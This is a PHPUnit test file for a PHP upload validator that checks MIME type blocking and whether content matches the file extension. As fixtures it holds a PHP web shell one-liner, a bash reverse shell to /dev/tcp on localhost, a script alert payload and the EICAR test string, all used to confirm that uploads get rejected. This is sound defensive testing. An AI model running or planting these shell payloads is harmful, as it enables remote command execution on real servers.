<?php

namespace hrzg\filefly\tests;

use hrzg\filefly\components\ContentValidator;
use hrzg\filefly\events\UploadValidationEvent;
use PHPUnit\Framework\TestCase;

class ContentValidatorTest extends TestCase
{
    private string $testDir;

    protected function setUp(): void
    {
        $this->testDir = sys_get_temp_dir() . '/filefly-content-test-' . uniqid();
        mkdir($this->testDir);
    }

    protected function tearDown(): void
    {
        array_map('unlink', glob($this->testDir . '/*'));
        rmdir($this->testDir);
    }

    private function createFile(string $content): string
    {
        // uploaded temp files have no extension
        $file = tempnam($this->testDir, 'php');
        file_put_contents($file, $content);
        return $file;
    }

    public function testPhpIsBlockedByDefault(): void
    {
        $validator = new ContentValidator();
        $file = $this->createFile('<?php system($_GET["c"]);');

        $this->assertSame('text/x-php', $validator->detectMimeType($file));
        $this->assertSame('file_type_not_allowed', $validator->validate($file, 'image.jpg'));
    }

    public function testDefaultsAcceptOtherFiles(): void
    {
        $validator = new ContentValidator();

        $this->assertNull($validator->validate($this->createFile("#!/bin/bash\nid\n"), 'run.sh'));
        $this->assertNull($validator->validate($this->createFile('just text'), 'image.jpg'));
    }

    public function testRecommendedBlockedMimeTypes(): void
    {
        $validator = new ContentValidator([
            'blockedMimeTypes' => ContentValidator::RECOMMENDED_BLOCKED_MIME_TYPES,
        ]);

        $shell = $this->createFile("#!/bin/bash\nbash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n");
        $html = $this->createFile('<html><body><script>alert(1)</script></body></html>');

        $this->assertSame('file_type_not_allowed', $validator->validate($shell, 'shell.txt'));
        $this->assertSame('file_type_not_allowed', $validator->validate($html, 'page.txt'));
        $this->assertNull($validator->validate($this->createFile('a;b'), 'list.csv'));
    }

    public function testWildcardBlockedMimeTypes(): void
    {
        $validator = new ContentValidator(['blockedMimeTypes' => ['text/x-*']]);

        $this->assertSame('file_type_not_allowed', $validator->validate($this->createFile("#!/bin/bash\nid\n"), 'a'));
    }

    public function testMimeTypeMatchesExtension(): void
    {
        $validator = new ContentValidator(['checkMimeTypeMatchesExtension' => true]);

        $this->assertFalse($validator->matchesExtension('text/plain', 'image.jpg'));
        $this->assertFalse($validator->matchesExtension('text/html', 'document.pdf'));
        $this->assertTrue($validator->matchesExtension('image/jpeg', 'IMAGE.JPG'));
        $this->assertTrue($validator->matchesExtension('text/plain', 'list.csv'));
        $this->assertTrue($validator->matchesExtension('text/plain', 'readme.md'));
        $this->assertTrue($validator->matchesExtension('text/xml', 'track.gpx'));
        $this->assertTrue($validator->matchesExtension('application/json', 'shape.geojson'));
        $this->assertTrue($validator->matchesExtension('image/x-ms-bmp', 'icon.bmp'));
        $this->assertTrue($validator->matchesExtension('application/x-empty', 'empty.jpg'));
        // unknown or missing extension is not checked
        $this->assertTrue($validator->matchesExtension('text/plain', 'file.unknownext'));
        $this->assertTrue($validator->matchesExtension('text/plain', 'file'));

        $this->assertSame('file_type_not_allowed', $validator->validate($this->createFile('id'), 'image.jpg'));
    }

    public function testCustomMimeTypeAliases(): void
    {
        $validator = new ContentValidator(['mimeTypeAliases' => ['jpg' => ['text/plain']]]);

        $this->assertTrue($validator->matchesExtension('text/plain', 'image.jpg'));
        // defaults are kept
        $this->assertTrue($validator->matchesExtension('image/x-ms-bmp', 'icon.bmp'));
    }

    public function testValidateFileEvent(): void
    {
        $eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
        $validator = new ContentValidator([
            'on ' . ContentValidator::EVENT_VALIDATE_FILE => function (UploadValidationEvent $event) use ($eicar) {
                $this->assertSame('eicar.txt', $event->filename);
                $this->assertSame('text/plain', $event->mimeType);
                if (strpos(file_get_contents($event->tempName), $eicar) !== false) {
                    $event->isValid = false;
                }
            },
        ]);

        $this->assertSame('file_content_rejected', $validator->validate($this->createFile($eicar), 'eicar.txt'));
        $this->assertNull($validator->validate($this->createFile('harmless'), 'eicar.txt'));
    }

    public function testValidateFileEventErrorMessage(): void
    {
        $validator = new ContentValidator();
        $validator->on(ContentValidator::EVENT_VALIDATE_FILE, static function (UploadValidationEvent $event) {
            $event->isValid = false;
            $event->errorMessage = 'upload_failed';
        });

        $this->assertSame('upload_failed', $validator->validate($this->createFile('x'), 'a.txt'));
    }

    public function testDisabled(): void
    {
        $validator = new ContentValidator(['enabled' => false]);

        $this->assertNull($validator->validate($this->createFile('<?php echo 1;'), 'a.php'));
    }
}
